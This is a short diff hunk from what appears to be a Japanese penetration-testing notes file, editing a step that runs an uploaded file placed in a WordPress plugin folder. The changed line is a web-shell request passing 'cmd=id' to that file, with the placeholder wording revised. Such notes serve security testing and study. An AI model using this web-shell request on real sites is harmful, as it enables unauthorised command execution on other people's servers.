@@ -164,7 +164,7 @@ zip <output_name> <file>
 
 4. 格納先で実行
 ```
-http://[Target]/wp-content/plugins/[プラグイン名]/[ファイル名]?cmd=id
+http://<target_IP>/wp-content/plugins/<プラグイン名>/<file>?cmd=id
 ```
 
 ## Misc
